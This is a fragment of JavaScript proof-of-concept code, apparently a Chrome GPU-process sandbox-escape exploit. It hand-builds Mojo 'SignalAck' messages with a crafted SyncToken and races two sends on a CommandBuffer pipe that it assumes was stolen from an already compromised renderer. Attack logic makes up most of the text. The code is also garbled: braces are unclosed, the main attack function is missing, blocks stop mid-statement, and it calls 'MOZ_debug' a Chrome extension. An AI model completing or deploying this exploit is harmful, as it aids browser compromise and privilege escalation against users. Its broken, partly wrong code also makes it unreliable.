<script>
// ========== Logging ==========
const log = (msg) => {
  document.getElementById('log').textContent += msg + '\n';

// ========== Mojo ordinal (SignalAck) ==========
const SIGNAL_ACK_ORDINAL = 5;

// ========== Helper: get the Mojo pipe for the CommandBuffer ==========
async function getCommandBufferRemote() {
  // Create a WebGL context to obtain the CommandBuffer Mojo remote
  const canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  const gl = canvas.getContext('webgl2', {
    powerPreference: 'high-performance',
    failIfMajorPerformanceCaveat: false,
    preserveDrawingBuffer: true
  });
  if (!gl) throw new Error('WebGL2 not available');

  // Flush once to initialize the command buffer
  gl.clear(gl.COLOR_BUFFER_BIT);
  gl.flush();

  // In Chrome, the CommandBuffer Mojo remote is accessible via gl.getExtension('MOZ_debug'). 
  // That extension is not public. Instead we can use the internal bindings:
  //   Mojo.bindInterface('gpu.mojom.CommandBuffer', ...)
  // from a privileged context (renderer process already compromised).
  // For a purely JS-based approach we assume the renderer is already owned
  // and we can directly call Mojo APIs.
  // We'll use the internal Mojo pipe handle stored in the GL context object.
  // (Simplification: in practice you need to extract the native Mojo handle via
  // a renderer RCE; here we simulate by using the public Mojo JS bindings if available
  // or by using a helper.)
  
  // Since we can't always expose the pipe, we'll use a known technique:
  // The renderer's GL context has a 'commandBufferProxy' that wraps the Mojo remote.
  // We can override that proxy to intercept and re-send messages.
  // For this PoC, we assume we already have the remote handle.
  // We'll use a global pointer to the remote.
  if (!window.g_commandBufferRemote) {
    // In a real exploit, you'd steal it from the GL context.
    throw new Error('CommandBuffer remote not available – need renderer RCE first');
  }
  return window.g_commandBufferRemote;
}

// ========== Mojo message encoder for SignalAck ==========
function encodeSignalAckMessage(tokenId, syncToken) {
  // Mojo message header: struct mojo_message_header {
  //   uint32 version;
  //   uint32 flags;
  //   uint32 name; // ordinal
  //   uint32 payload_size;
  // }
  const header = new ArrayBuffer(16);
  const headerView = new DataView(header);
  headerView.setUint32(0, 0, true); // version
  headerView.setUint32(4, 0, true); // flags (kMessageExpectsResponse=0)
  headerView.setUint32(8, SIGNAL_ACK_ORDINAL, true); // ordinal
  // payload size will be set later

  // SignalAck params: uint32_t token_id, SyncToken token
  // SyncToken layout (from Ghidra): 32 bytes? offset +0x18 is counter, etc.
  // We'll use the exact structure we observed: 4 x 8-byte fields.
  // token->counter at offset 24 (0x18) must be less than flush counter.
  const payload = new ArrayBuffer(4 + 32); // token_id + SyncToken (32 bytes)
  const payloadView = new DataView(payload);
  payloadView.setUint32(0, tokenId, true); // token_id
  // Copy SyncToken fields (we need to match the expected layout)
  // From earlier analysis, SyncToken is 32 bytes: first 8 bytes are something,
  // next 8 something else, counter at offset 24.
  // We'll use a sync token from a real flush to ensure it's valid.
  const tokenArray = new Uint8Array(syncToken); // syncToken is 32 bytes
  new Uint8Array(payload, 4).set(tokenArray);
  
  headerView.setUint32(12, payload.byteLength, true); // payload size

  // Concatenate header + payload
  const message = new ArrayBuffer(header.byteLength + payload.byteLength);
  new Uint8Array(message).set(new Uint8Array(header), 0);
  new Uint8Array(message).set(new Uint8Array(payload), header.byteLength);
  return message;
}

// ========== Send a Mojo message on the CommandBuffer pipe ==========
function sendMojoMessage(remote, message) {
  // remote is a MojoRemote object (from Mojo JS bindings)
  // In a real exploit, you would call remote.write(message)
  if (typeof remote.writeMessage === 'function') {
    remote.writeMessage(message);
  } else {
    // Fallback: use raw Mojo IPC (if bindings available)
    throw new Error('Mojo remote missing write method');
  }
}

// ========== Obtain a valid sync token ==========
async function getValidSyncToken(gl) {
  // Perform a GPU operation and obtain a sync token.
  const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
  gl.flush();
  // Wait until the sync is signalled (to guarantee it's old)
  return new Promise(resolve => {
    const check = () => {
      const status = gl.clientWaitSync(sync, 0, 0);
      if (status === gl.ALREADY_SIGNALED || status === gl.CONDITION_SATISFIED) {
        // Extract token data: this is GPU-process internal, but we can use
        // the sync object to get the token ID and token values.
        // In Chrome, the SyncToken is exposed via extension or we can guess.
        resolve(sync);
      } else {
        requestAnimationFrame(check);
      }
    };
    check();
  });
}

// ========== Main attack sequence ==========

    // Extract the SyncToken data (implementation-specific)
    // In practice, you'd read the token ID and counter from the GL context internals.
    // For this PoC, we can use the token ID from the sync object (in Chrome it's stored as
    // a property on the WebGLSync object, but not exposed). We'll assume we can read it.
    // For a real exploit, you'd read it via a memory read primitive.

    // For the race to work, the token must be "already flushed" (counter < next_flush_counter)
    // We'll use a dummy token with a very low counter, hoping it bypasses the early check.
    // In the worst case, the early check will catch it and it won't race. To guarantee,

    // Get the CommandBuffer remote (requires renderer RCE to steal)
    // In a real exploit, you'd do:
    // const remote = Mojo.getRemote('gpu.mojom.CommandBuffer', pipeHandle);
    // For now, we assume window.g_commandBufferRemote is set.
    if (typeof window.g_commandBufferRemote === 'undefined') {
      log('Falling back to simulated Mojo remote for testing...');
      // To test without RCE, we can use a chrome://inspect trick or a custom build.
      // We'll simulate by sending the message via the real Mojo if we can access it.
      // In many cases, the renderer's Mojo JS bindings are available.
      if (typeof Mojo !== 'undefined' && Mojo.bindInterface) {
        log('Using Mojo.bindInterface...');

        log('Cannot obtain remote from JS without renderer RCE. This PoC requires a compromised renderer.');
      }
    }

    // If we have the remote, send two SignalAck messages back-to-back
    if (window.g_commandBufferRemote) {
      const remote = window.g_commandBufferRemote;

      log('Sending first SignalAck...');

      // Schedule second send on microtask to race
      queueMicrotask(() => {

    } else {
      log('=== In a real exploit, you would: ===');
      log('1. Steal the Mojo remote from the GL context (via renderer RCE)');
